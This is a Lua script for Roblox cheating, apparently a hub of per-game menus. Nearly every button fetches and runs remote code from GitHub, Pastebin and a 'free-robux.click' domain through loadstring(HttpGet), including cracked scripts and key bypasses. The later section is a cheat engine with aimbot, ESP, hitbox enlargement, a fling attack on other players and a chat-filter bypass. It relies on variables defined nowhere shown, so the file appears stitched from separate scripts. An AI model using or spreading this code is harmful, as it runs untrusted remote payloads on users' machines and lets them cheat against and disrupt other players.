elseif game.GameId==4293374620 then
	gametab=Window:CreateTab("Super league soccer")
	Button = gametab:CreateButton({
		Name = "Beast Hub",
		Callback = function()
			loadstring(game:HttpGet("https://cracklua.github.io/cracks/beast"))()
		  end
	})
elseif game.GameId==2851381018 then
	gametab=Window:CreateTab("Taxi Boss")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Marco8642/science/main/Taxi%20Boss'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Shows all NPC Ratings in your F9 Console",
	Callback = function()
		for _, g in pairs(game:GetService("Workspace").NewCustomers:GetDescendants()) do
            pcall(function()
                if g.Name == "Rating" then
                    if tonumber(g.Text) >= 0.1 and tonumber(g.Text) <= 1.9 then
                        print("Low Ratings: "..tonumber(g.Text))
                    end
                    if tonumber(g.Text) >= 2 and tonumber(g.Text) <= 3.9 then
                        print("Medium Ratings: "..tonumber(g.Text))
                    end
                    if tonumber(g.Text) >= 4 then
                        print("High Ratings: "..tonumber(g.Text))
                    end
                end
            end)
        end
  	end
})
local Label = gametab:CreateLabel("Alost all scripts are paid so only these 2 working")
elseif game.GameId==3808081382 then
	gametab=Window:CreateTab("The Strongest Battlegrounds")
local Label = gametab:CreateLabel("Use 1-2 Script at same time if u use more u will get Callback error")
local Label = gametab:CreateLabel("Copies Key Means it will copy key to your clipboard")
Button = gametab:CreateButton({
	Name = "NS Hub (Key : Nut Hub Op)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/keyrblxR",true))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/TSBG/main/Solara"))()
  	end
})
Button = gametab:CreateButton({
	Name = "LN Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/QGD9as3r",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Legends Hub (Copies Key)",
	Callback = function()
        setclipboard("349058034Best82397Strongest")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/KJ/main/TSB"))()
  	end
})
Button = gametab:CreateButton({
	Name = "FFJ Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/TSBUtils.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "NBLM Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/NBLMSCRIPTS/NBLMSCRIPTHUB/main/SKIBIDI"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Combo's",
	Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/XNKwIjUX/raw"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Apoc Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/8J3caWVX",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Kade Hub (not really good)",
	Callback = function()
		loadstring(game:HttpGet(('https://gist.githubusercontent.com/skibiditoiletfan2007/9c8acec1b350bb2a27f4101e2eec803e/raw/bd6fe461cb8fe7b11c53f71999759b1fc5b5e649/TheCaptainsGoDownWithTheirShip.lua'),true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Zenon Hub (Copies Key)",
	Callback = function()
        setclipboard("Zenon12345")
		loadstring(game:HttpGet("https://pastefy.app/gbwEzNX4/raw"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Aim Lock",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sdfesdfsedf/srgtergasdfs/main/silent", true))()
  	end
})
elseif game.GameId==3177453609 then
	gametab=Window:CreateTab("Therapy")
Button = gametab:CreateButton({
	Name = "Orbit Player Spam sound",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/p6FEhZZe",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Chat Bypass (you have to type words)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-BYPASS/main/kawaii-bypass",true))()
  	end
})
elseif game.GameId==6174407103 then
	gametab=Window:CreateTab("Titan Training Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/TitanTrainingSimulator1881.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Legends Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/TitanTrainingSim.lua'))()
  	end
})
elseif game.GameId==703124385 then
	gametab=Window:CreateTab("Tower of Hell")
Button = gametab:CreateButton({
	Name = "Starry Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/hello-n-bye/starry/main/main.lua", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Sprin Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/dqvh/dqvh/main/SprinHub",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Auto Win",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ArgetnarYT/scripts/main/Tower_of_Hell_Farm.lua"))()
  	end
})
elseif game.GameId==124283622 then
	gametab=Window:CreateTab("TPS: Street Soccer")
local Label = gametab:CreateLabel("Dont try to execute all script at same time rejoin & execute")
Button = gametab:CreateButton({
	Name = "Byte Hub Auto Farm Goals",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DamThien332/TPS-Script/main/AutoFarmGoals.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Extrame Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/xfaz/newtps/main/kuchi'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Wreston Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Wreston00/tpsreach/main/tpsreach.lua",true))()
  	end
})
elseif game.GameId==5661134200 then
	gametab=Window:CreateTab("Track & Field: Infinite")
Button = gametab:CreateButton({
	Name = "DEP Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JayXSama/Track-And-Field-Infinite/main/Solara"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Cool Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/Track-Field/main/free.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Legends Hub (Copies Key)",
	Callback = function()
        setclipboard("328732!!Track839!!")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Field/main/Track"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Olympic Hub (Join Server To Get Key)",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Supremechaotic/Key/main/HUB.lua'))()
  	end
})
local Label = gametab:CreateLabel("Legends Hub Will copy key to your clipboard so just click CTRL + V to paste")
elseif game.GameId==6026836726 then
	gametab=Window:CreateTab("Tycoon RNG")
Button = gametab:CreateButton({
	Name = "Madbuk Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/MadbukScripts/Scripts/main/Obfuscated%20Tycoon%20RNG.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "RYK Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/ryk')()
  	end
})
Button = gametab:CreateButton({
	Name = "Auto Collect and Obby",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/jjp2iky/scripts/main/TycoonRNG"))()
  	end
})
elseif game.GameId==4871329703 then
	gametab=Window:CreateTab("Type soul")
local Label = gametab:CreateLabel("Don't Execute in lobby join game and execute")
Button = gametab:CreateButton({
	Name = "Legends Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/LOLking123456/newtype/main/soul'))()
  	end
})
local Label = gametab:CreateLabel("Alost all scripts are paid & Patched so only this 1 working")
elseif game.GameId==2805713501 then
gametab=Window:CreateTab("Tower of Jumps")
Button = gametab:CreateButton({
	Name = "Devil's Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/towerofjumpscript/main/main"))();
  	end
})
elseif game.GameId==5437909627 then
	gametab=Window:CreateTab("Tank Simulator")
	Button = gametab:CreateButton({
		Name = "Ywxo Hub",
		Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/TankFightSimulator.lua"))()
		  end
	})
elseif game.GameId==3624423521 then
	gametab=Window:CreateTab("Underground War 2.0")
Button = gametab:CreateButton({
	Name = "Rinss Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Kill Aura",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/UndergroundWar'))()
  	end
})
elseif game.GameId==4864117649 then
	gametab=Window:CreateTab("untitled tag game")
Button = gametab:CreateButton({
	Name = "Ranxware",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/2fYMPJZY",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		untitled, taggame = pcall(game.HttpGet, game, ('https://%s/%s'):format('skibiditoilet.free-robux.click', 'p/raw/bryvmasag5'));
assert(untitled, 'Couldnt retrieve script,', taggame);
loadstring(taggame)();
game:GetService('UserInputService').MouseIconEnabled = true
  	end
})
Button = gametab:CreateButton({
	Name = "Weird Script Tbh but works",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/nAlwspa/Into/main/hhh"))()
  	end
})
elseif game.GameId==1480782352 then
	gametab=Window:CreateTab("Vehicle Legends")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/Vehicle%20legends"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ultimate Hub (Might take time to load)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
  	end
})
elseif game.GameId==5166168575 then
	gametab=Window:CreateTab("Viral Simulator")
Button = gametab:CreateButton({
	Name = "Inf Wins",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/EzPHKHBG",true))()
  	end
})
elseif game.GameId==1526814825 then
	gametab=Window:CreateTab("War Tycoon")
Button = gametab:CreateButton({
	Name = "Awaken Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Awakenchan/Misc-Release/main/WarTycoon"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub (Have tp box)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/rb/194b7151863d8635b13b1a4972c2fed338bb6639/wartyccon.lua",true))()
  	end
})
elseif game.GameId==5663507626 then
	gametab=Window:CreateTab("Warrior Simulator")
Button = gametab:CreateButton({
	Name = "DK Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
  	end
})
Button = gametab:CreateButton({
	Name = "Tupo Hub (Copies Key Just CTRL + V To paste)",
	Callback = function()
        setclipboard("KennielISBACKReborn")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/Warrior-Simulator-BETA-/main/Warrior%20Simulator%20%5BBETA%5D%20RayField"))()
  	end
})
elseif game.GameId==873703865 then
	gametab=Window:CreateTab("Westbound")
Button = gametab:CreateButton({
	Name = "Rylor Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Drrushh/Drrushh/main/Kdom",true))();
  	end
})
Button = gametab:CreateButton({
	Name = "ESP and Silent aim",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/9T8wKLah",true))()
  	end
})
elseif game.GameId==1016936714 then
	gametab=Window:CreateTab("Your Bizarre Adventure")
Button = gametab:CreateButton({
	Name = "Item Farm",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Vuffi2007/YBA-Teleport-to-Items-GUI/main/YBA-Teleport-to-Items-GUI.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "YBA Sucks Ass",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobias020108Back/YBA-AUT/main/YBA-GUI-Rewrite.lua"))()
  	end
})
elseif game.GameId==504035427 then
	gametab=Window:CreateTab("Zombie Attack")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/Zombie/main/attack"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ski Hub",
	Callback = function()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yousuck780/Zombie-attack/main/zombie"), true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Project LKB Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/Zombie-Attack-Projeto-LKB/main/Open%20Source"))()
  	end
})
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/scripts/main/universal2.txt",true))()
end
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Visible") then
	 game:GetService("Players").LocalPlayer.PlayerGui.Visible:Destroy()
 end
 local Visible = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Button = Instance.new("ImageButton")
 local UICorner = Instance.new("UICorner")
 Visible.Name = "Visible"
 Visible.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 Frame.Parent = Visible
 Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 Frame.BackgroundTransparency = 0.5
 Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0, 20, 0.5, -20)
 Frame.Size = UDim2.new(0, 32, 0, 32)
 Button.Name = "Button"
 Button.Parent = Frame
 Button.BackgroundTransparency = 1
 Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Button.Size = UDim2.new(0, 20, 0, 20)
 Button.Position = UDim2.new(0.5, -Button.Size.X.Offset / 2, 0.5, -Button.Size.Y.Offset / 2)
 Button.Image = "http://www.roblox.com/asset/?id=15757220056"
 local toggle = false
 Button.MouseButton1Click:Connect(function()
	 toggle = not toggle
	 if toggle then
		 game:GetService("VirtualInputManager"):SendKeyEvent(true, 127, false, game)
		 game:GetService("VirtualInputManager"):SendKeyEvent(false, 127, false, game)
		 Button.Image = "http://www.roblox.com/asset/?id=15757188966"
	 else
		 game:GetService("VirtualInputManager"):SendKeyEvent(true, 127, false, game)
		 game:GetService("VirtualInputManager"):SendKeyEvent(false, 127, false, game)
		 Button.Image = "http://www.roblox.com/asset/?id=15757220056"
	 end
 end)
 Frame.MouseEnter:Connect(function()
	 TweenService:Create(
		 Frame,
		 TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		 {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
	 ):Play()
 end)
 Frame.MouseLeave:Connect(function()
	 TweenService:Create(
		 Frame,
		 TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		 {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}
	 ):Play()
 end)
 UICorner.CornerRadius = UDim.new(0.25, 0)
 UICorner.Name = "Looks like"
 UICorner.Parent = Frame
Workspace.DescendantAdded:Connect(function(v) if Settings.BlackHoleActive then ForcePart(v) end end)
function AutoUpdateAllLists()
    local names = {}
    for _, p in ipairs(Players:GetPlayers()) do if p ~= LocalPlayer then table.insert(names, p.Name) end end
    AimPlayerDropdown:Refresh(names)
    HitboxPlayerDropdown:Refresh(names)
    FlingPlayerDropdown:Refresh(names)
    SpecDropdown:Refresh(names)
    TargetDropdown:Refresh(names)
end
Players.PlayerAdded:Connect(AutoUpdateAllLists)
Players.PlayerRemoving:Connect(AutoUpdateAllLists)
task.spawn(AutoUpdateAllLists)
local function IsPlayerVisible(part)
    if not Settings.AimWallCheck then return true end
    return #Camera:GetPartsObscuringTarget({part.Position}, {LocalPlayer.Character, part.Parent}) == 0
end
local function GetClosestPlayer(targetsTab, teamCheck, friendCheck)
    local closest, shortestDist = nil, math.huge
    local localHrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if Settings.InvisibilityActive and FakeClone then localHrp = FakeClone:FindFirstChild("HumanoidRootPart") end
    if Settings.GhostActive and GhostClone then localHrp = GhostClone:FindFirstChild("HumanoidRootPart") end
    if not localHrp then return nil end
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        if #targetsTab > 0 and not table.find(targetsTab, player.Name) then continue end
        if teamCheck and player.Team == LocalPlayer.Team then continue end
        if friendCheck and LocalPlayer:IsFriendsWith(player.UserId) then continue end
        local char = player.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local part = char:FindFirstChild("HumanoidRootPart")
            local dist = (part.Position - localHrp.Position).Magnitude
            if dist < shortestDist then shortestDist = dist; closest = player end
        end
    end
    return closest
end
RunService.RenderStepped:Connect(function()
    local char = LocalPlayer.Character
    local localHrp = char and char:FindFirstChild("HumanoidRootPart")
    local localHum = char and char:FindFirstChildOfClass("Humanoid")
    if Settings.InvisibilityActive and FakeClone and localHrp and localHum then
        local fakeHrp = FakeClone:FindFirstChild("HumanoidRootPart")
        local fakeHum = FakeClone:FindFirstChildOfClass("Humanoid")
        if fakeHrp and fakeHum then
            fakeHum.WalkSpeed = localHum.WalkSpeed
            fakeHum.JumpPower = localHum.JumpPower
            fakeHum:Move(localHum.MoveDirection, false)
            if localHum.Jump then fakeHum.Jump = true end
            localHrp.CFrame = CFrame.new(-1263378.625, 1674000.375, 1201721.5)
            localHrp.Velocity = Vector3.new(0, 0, 0)
        end
    end
    if Settings.GhostActive and GhostClone and localHrp and localHum then
        local gHrp = GhostClone:FindFirstChild("HumanoidRootPart")
        local gHum = GhostClone:FindFirstChildOfClass("Humanoid")
        if gHrp and gHum then
            gHum.WalkSpeed = localHum.WalkSpeed
            gHum.JumpPower = localHum.JumpPower
            gHum:Move(localHum.MoveDirection, false)
            if localHum.Jump then gHum.Jump = true end
            if GhostSavedCFrame then localHrp.CFrame = GhostSavedCFrame end
            localHrp.Velocity = Vector3.new(0, 0, 0)
        end
    end
    if Settings.RobloxEgorActive and localHum and localHrp then
        localHum.WalkSpeed = 3
        if localHum.MoveDirection.Magnitude > 0 then
            local animate = char:FindFirstChild("Animate")
            local runAnim = animate and animate:FindFirstChild("run") and animate.run:FindFirstChildOfClass("Animation")
            if runAnim and localHum:FindFirstChildOfClass("Animator") then
                if not EgorTrack or EgorTrack.Animation ~= runAnim then
                    if EgorTrack then EgorTrack:Stop(); EgorTrack:Destroy() end
                    EgorTrack = localHum:FindFirstChildOfClass("Animator"):LoadAnimation(runAnim)
                    EgorTrack.Looped = true
                    EgorTrack:Play()
                end
                EgorTrack:AdjustSpeed(5)
            end
        else
            if EgorTrack then EgorTrack:Stop(); EgorTrack:Destroy(); EgorTrack = nil end
        end
    end
    if Settings.BlackHoleActive and bhHumanoidRootPart and bhAttachment1 then
        Settings.BlackHoleAngle = Settings.BlackHoleAngle + math.rad(2)
        local offsetX = math.cos(Settings.BlackHoleAngle) * Settings.BlackHoleRadius
        local offsetZ = math.sin(Settings.BlackHoleAngle) * Settings.BlackHoleRadius
        local activeHrp = bhHumanoidRootPart
        if Settings.InvisibilityActive and FakeClone then activeHrp = FakeClone:FindFirstChild("HumanoidRootPart")
        elseif Settings.GhostActive and GhostClone then activeHrp = GhostClone:FindFirstChild("HumanoidRootPart") end
        if activeHrp then bhAttachment1.WorldCFrame = activeHrp.CFrame * CFrame.new(offsetX, 0, offsetZ) end
    end
    if Settings.SpectateActive and Settings.SpectateTarget ~= "" then
        local p = Players:FindFirstChild(Settings.SpectateTarget)
        if p and p.Character and p.Character:FindFirstChildOfClass("Humanoid") then
            Camera.CameraSubject = p.Character:FindFirstChildOfClass("Humanoid")
        end
    end
    if Settings.AimEnabled then
        local target = GetClosestPlayer(Settings.AimTargetPlayers, Settings.AimTeamCheck, Settings.AimFriendCheck)
        if target and target.Character then
            local activePartName = (Settings.AimWay == "Camera") and Settings.CameraPart or Settings.BodyPart
            local part = target.Character:FindFirstChild(activePartName)
            if part and IsPlayerVisible(part) then
                local pos = part.Position
                if Settings.AimPredictionEnabled then pos = pos + (part.Velocity * Settings.AimPredictionTime) end
                if Settings.AimWay == "Camera" then
                    Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, pos)
                elseif Settings.AimWay == "Body" and localHrp then
                    local currentHrp = localHrp
                    if Settings.InvisibilityActive and FakeClone and FakeClone:FindFirstChild("HumanoidRootPart") then currentHrp = FakeClone.HumanoidRootPart
                    elseif Settings.GhostActive and GhostClone and GhostClone:FindFirstChild("HumanoidRootPart") then currentHrp = GhostClone.HumanoidRootPart end
                    currentHrp.CFrame = CFrame.lookAt(currentHrp.Position, Vector3.new(pos.X, currentHrp.Position.Y, pos.Z))
                end
            end
        end
    end
    if Settings.AntiBang and localHrp then
        local closest = GetClosestPlayer({}, false, false)
        if closest and closest.Character and closest.Character:FindFirstChild("HumanoidRootPart") then
            local tPos = closest.Character.HumanoidRootPart.Position
            local currentHrp = localHrp
            if Settings.InvisibilityActive and FakeClone and FakeClone:FindFirstChild("HumanoidRootPart") then currentHrp = FakeClone.HumanoidRootPart
            elseif Settings.GhostActive and GhostClone and GhostClone:FindFirstChild("HumanoidRootPart") then currentHrp = GhostClone.HumanoidRootPart end
            currentHrp.CFrame = CFrame.lookAt(currentHrp.Position, Vector3.new(tPos.X, currentHrp.Position.Y, tPos.Z))
        end
    end
    if (Settings.HeadsitActive or Settings.CarpetActive) and Settings.TargetingPlayer ~= "" and localHrp then
        local p = Players:FindFirstChild(Settings.TargetingPlayer)
        if p and p.Character then
            local activeHrp = localHrp
            local activeHum = localHum
            if Settings.InvisibilityActive and FakeClone then activeHrp = FakeClone:FindFirstChild("HumanoidRootPart"); activeHum = FakeClone:FindFirstChildOfClass("Humanoid")
            elseif Settings.GhostActive and GhostClone then activeHrp = GhostClone:FindFirstChild("HumanoidRootPart"); activeHum = GhostClone:FindFirstChildOfClass("Humanoid") end
            if activeHrp then
                localHrp.Velocity = Vector3.new(0, 0, 0)
                if Settings.HeadsitActive and p.Character:FindFirstChild("Head") then
                    if activeHum then activeHum.Sit = true end
                    activeHrp.CFrame = p.Character.Head.CFrame * CFrame.new(0, 1.2, 0)
                elseif Settings.CarpetActive and p.Character:FindFirstChild("HumanoidRootPart") then
                    if activeHum then activeHum.Sit = false end
                    activeHrp.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(0, -2.8, 0) * CFrame.Angles(math.rad(90), 0, 0)
                end
            end
        end
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        local pChar = player.Character
        if not pChar then
            if Tracers[player] then Tracers[player].Visible = false end
            continue
        end
        local hrp = pChar:FindFirstChild("HumanoidRootPart")
        if hrp then
            if Settings.HitboxEnabled then
                local valid = true
                if #Settings.HitboxTargetPlayers > 0 and not table.find(Settings.HitboxTargetPlayers, player.Name) then valid = false end
                if Settings.HitboxTeamCheck and player.Team == LocalPlayer.Team then valid = false end
                if Settings.HitboxFriendCheck and LocalPlayer:IsFriendsWith(player.UserId) then valid = false end
                if valid then
                    hrp.Size = Vector3.new(Settings.HitboxSize, Settings.HitboxSize, Settings.HitboxSize)
                    hrp.Transparency = Settings.HitboxTransparency
                    hrp.Color = ColorMap[Settings.HitboxColor] or Color3.fromRGB(255, 0, 0)
                    hrp.Material = Enum.Material.Neon
                    hrp.CanCollide = false
                else
                    hrp.Size = Vector3.new(2, 2, 1)
                    hrp.CanCollide = true
                end
            else
                hrp.Size = Vector3.new(2, 2, 1)
                hrp.CanCollide = true
            end
            if Settings.EspEnabled then
                local bb = pChar:FindFirstChild("Bdev_EspName")
                if Settings.EspName then
                    if not bb then
                        bb = Instance.new("BillboardGui", pChar)
                        bb.Name = "Bdev_EspName"
                        bb.AlwaysOnTop = true
                        bb.Size = UDim2.new(0, 200, 0, 30)
                        bb.StudsOffset = Vector3.new(0, 3, 0)
                        local lbl = Instance.new("TextLabel", bb)
                        lbl.Size = UDim2.new(1, 0, 1, 0)
                        lbl.BackgroundTransparency = 1
                        lbl.TextSize = 14
                        lbl.Font = Enum.Font.SourceSansBold
                        lbl.Text = player.Name
                    end
                    bb.TextLabel.TextColor3 = ColorMap[Settings.EspColor] or Color3.fromRGB(255,0,0)
                else if bb then bb:Destroy() end end
                local hl = pChar:FindFirstChild("Bdev_EspHighlight")
                if Settings.EspHighlight then
                    if not hl then
                        hl = Instance.new("Highlight", pChar)
                        hl.Name = "Bdev_EspHighlight"
                    end
                    hl.FillColor = ColorMap[Settings.EspColor] or Color3.fromRGB(255,0,0)
                    hl.FillTransparency = 0.5
                    hl.OutlineColor = Color3.fromRGB(255,255,255)
                else if hl then hl:Destroy() end end
                local box = pChar:FindFirstChild("Bdev_EspBox")
                if Settings.EspBox then
                    if not box then
                        box = Instance.new("SelectionBox", pChar)
                        box.Name = "Bdev_EspBox"
                        box.Adornee = pChar
                        box.AlwaysOnTop = true
                        box.LineThickness = 0.05
                    end
                    box.Color3 = ColorMap[Settings.EspColor] or Color3.fromRGB(255,0,0)
                else if box then box:Destroy() end end
                if Settings.EspLine and Drawing then
                    local line = Tracers[player]
                    if not line then
                        line = Drawing.new("Line")
                        line.Thickness = 1
                        Tracers[player] = line
                    end
                    local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
                    if onScreen then
                        line.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                        line.To = Vector2.new(screenPos.X, screenPos.Y)
                        line.Color = ColorMap[Settings.EspColor] or Color3.fromRGB(255,0,0)
                        line.Visible = true
                    else line.Visible = false end
                else if Tracers[player] then Tracers[player].Visible = false end end
            else
                if pChar:FindFirstChild("Bdev_EspName") then pChar.Bdev_EspName:Destroy() end
                if pChar:FindFirstChild("Bdev_EspHighlight") then pChar.Bdev_EspHighlight:Destroy() end
                if pChar:FindFirstChild("Bdev_EspBox") then pChar.Bdev_EspBox:Destroy() end
                if Tracers[player] then Tracers[player].Visible = false end
            end
        end
        if Settings.AntiFling then
            for _, part in ipairs(pChar:GetChildren()) do
                if part:IsA("BasePart") then part.CanCollide = false; part.Velocity = Vector3.new(0,0,0) end
            end
        end
    end
    if Settings.AntiVoid and localHrp then
        if not Workspace:Raycast(localHrp.Position, Vector3.new(0, -1000, 0)) and localHrp.Position.Y < -45 and not Settings.InvisibilityActive and not Settings.GhostActive then
            localHrp.Velocity = Vector3.new(localHrp.Velocity.X, 0, localHrp.Velocity.Z)
            AntiVoidPlatform.CFrame = CFrame.new(localHrp.Position.X, localHrp.Position.Y - 3.5, localHrp.Position.Z)
            AntiVoidPlatform.CanCollide = true
        else AntiVoidPlatform.CanCollide = false end
    else AntiVoidPlatform.CanCollide = false end
end)
task.spawn(function()
    while task.wait(0.3) do
        if Settings.AntiRagdoll and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
            local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        end
    end
end)
Players.PlayerRemoving:Connect(function(player)
    if Tracers[player] then Tracers[player]:Remove(); Tracers[player] = nil end
end)
function ExecuteFlingAttack()
    if Settings.FlingTarget == "" then return end
    local p = Players:FindFirstChild(Settings.FlingTarget)
    if not p or not p.Character or not p.Character:FindFirstChild("HumanoidRootPart") then return end
    local localHrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if Settings.InvisibilityActive and FakeClone and FakeClone:FindFirstChild("HumanoidRootPart") then localHrp = FakeClone.HumanoidRootPart
    elseif Settings.GhostActive and GhostClone and GhostClone:FindFirstChild("HumanoidRootPart") then localHrp = GhostClone.HumanoidRootPart end
    if localHrp then
        local old = localHrp.CFrame
        local start = tick()
        local con; con = RunService.Heartbeat:Connect(function()
            if tick() - start > 3.5 or not p.Character or not p.Character:FindFirstChild("HumanoidRootPart") then
                con:Disconnect(); localHrp.Velocity = Vector3.new(0,0,0); localHrp.CFrame = old; return
            end
            localHrp.CanCollide = false
            localHrp.Velocity = Vector3.new(999999, 999999, 999999)
            localHrp.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-1,1)/10, 0, math.random(-1,1)/10)
        end)
    end
end
